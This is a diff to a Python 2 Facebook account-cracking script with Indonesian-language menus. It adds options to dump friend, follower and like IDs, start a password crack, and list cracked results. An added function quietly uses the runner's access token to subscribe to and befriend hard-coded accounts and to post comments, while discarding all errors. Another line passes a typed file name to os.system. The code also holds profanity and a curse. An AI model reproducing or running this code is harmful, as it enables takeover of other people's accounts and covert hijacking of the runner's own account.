@@ -157,101 +157,100 @@ def login():
         os.sys.exit()
     else:
         exit(' *! Fill it Correctly')
-##### MENU #####
-def menu():
-  try:
-    toket = open('login.txt','r').read()
-    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
-    a = json.loads(otw.text)
-    nm = a['name']
-    id = a['id']
-    tl = a['birthday'].replace("/","-")
-  except Exception as e:
-    print (' *! Token Invalid')
-    time.sleep(1)
-    login()
-  except KeyError:
-    print (' *! Token Invalid')
-    time.sleep(1)
-    os.system('rm -rf login.txt')
-    login()
-  except requests.exceptions.ConnectionError:
-    print (' *! Connection Error')
-    os.sys.exit()
-  except Exception as e:
-    print (' *! Token Invalid')
-    time.sleep(1)
-    login()
-  os.system("clear")
-  print logo
-  print ('\n *•> Name : '+nm)
-  print (' *•> ID : '+id)
-  print (' *•> Date of birth : '+tl)
-
-  print ('\n *1 Crack ID From Friends')
-  print (' *2 Crack ID From Public')
-  print (' *3 Crack ID From Followers')
-  print (' *4 Crack ID From Likes')
-  print (' *5 View Results')
-  print (' *0 Exit (Hapus Token/Cookies)\n')
-  mn=raw_input(" *-> Input : ")
-  if mn=="":
-	print (' *! Fill it Correctly')
-	menu()
-  elif mn=="1":
-    teman()
-  elif mn=="2":
-    publik()
-  elif mn=="3":
-    followers()
-  elif mn=="4":
-    like()
-  elif mn=="5":
-    print ('\n *1 View Results Ok')
-    print (' *2 View Results Cp')
-    print (' *0 Kembali\n')
-    hs = raw_input(' *-> Input : ')
-    if hs == '':
-        menu()
-    elif hs == '1' or hs == '01':
-	ok()
-    elif hs == '2' or hs == '02':
-	cp()
-    else:
-	exit(' *! Fill it Correctly')
-  elif mn=="0":
+### ORANG GANTENG ###
+def moch_yayan():
+    os.system('clear')
     try:
-      os.remove("login.txt")
-      print (' *! Successfully Delete Token/Cookies')
-      os.sys.exit()
-    except Exception as e:
-	print (' *! File Not Existing')
-	os.sys.exit()
-  else:
-    print (' *! Fill it Correctly')
-    menu()
-def ok():
-	try:
-		ok=open('Ok.txt','r').read()
-		print ' '
-		print ok
-	except KeyError,IOError:
-                print (' *! Results Ok None')
-		os.sys.exit()
-	except Exception as e:
-	        print (' *! Results Ok None')
-	        os.sys.exit()
-def cp():
+    	kontol = open('.ppk/.memek.txt', 'r').read()
+    except IOError:
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
+    try:
+        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
+    except KeyError:
+        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
+    except requests.exceptions.ConnectionError:
+        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
+    print logo
+    IP = requests.get('http://ip-api.com/json').json()['query']
+    print '___________________________________________________________\n';time.sleep(0.03)
+    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
+    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
+    print '___________________________________________________________\n';time.sleep(0.03)
+    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
+    print ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
+    print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
+    print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
+    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
+    print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
+    print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
+    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
+    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
+    print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
+    pepek = raw_input('\n [*] menu : ')
+    if pepek == '':
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
+    elif pepek in['1','01']:
+        teman(kontol)
+    elif pepek in['2','02']:
+        publik(kontol)
+    elif pepek in['3','03']:
+        followers(kontol)
+    elif pepek in['4','04']:
+        postingan(kontol)
+    elif pepek in['5','05']:
+        __crack__().plerr()
+    elif pepek in['6','06']:
+        cek_ingfo(kontol)
+    elif pepek in['7','07']:
         try:
-                cp=open('Cp.txt','r').read()
-		print ' '
-                print cp
-        except KeyError,IOError:
-                print (' *! Results Cp None')
-                os.sys.exit()
-	except Exception as e:
-        	print (' *! Results Cp None')
-	        os.sys.exit()
+            dirs = os.listdir("results")
+            print '\n [ hasil crack yang tersimpan di file anda ]\n'
+            for file in dirs:
+                print(" [%s+%s] %s"%(O,N,file))
+            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
+            if file == "":
+                file = raw_input("\n [%s?%s] masukan nama file :%s %s"%(M,N,H,N))
+            total = open("results/%s"%(file)).read().splitlines()
+            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
+            nm_file = ("%s"%(file)).replace("-", " ")
+            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
+            print(" [%s×%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s\n"%(O,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
+            os.system("cat results/%s"%(file))
+            print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+        except (IOError):
+            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+    elif pepek in['8','08']:
+        seting_yntkts()
+    elif pepek in['9','09']:
+        info_tools()
+    elif pepek in['0','00']:
+        print '\n'
+        tod()
+        time.sleep(1);os.system('rm -rf .ppk/.memek.txt')
+        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
+    else:
+        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
+# Yang ganti bot nya gw sumpahin mak lo mati ajg!
+def wuhan(kontol):
+    try:
+        kentod = kontol
+        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
+    except:
+    	pass
+
 ##### CRACK TEMAN #####
 def teman():
         try:
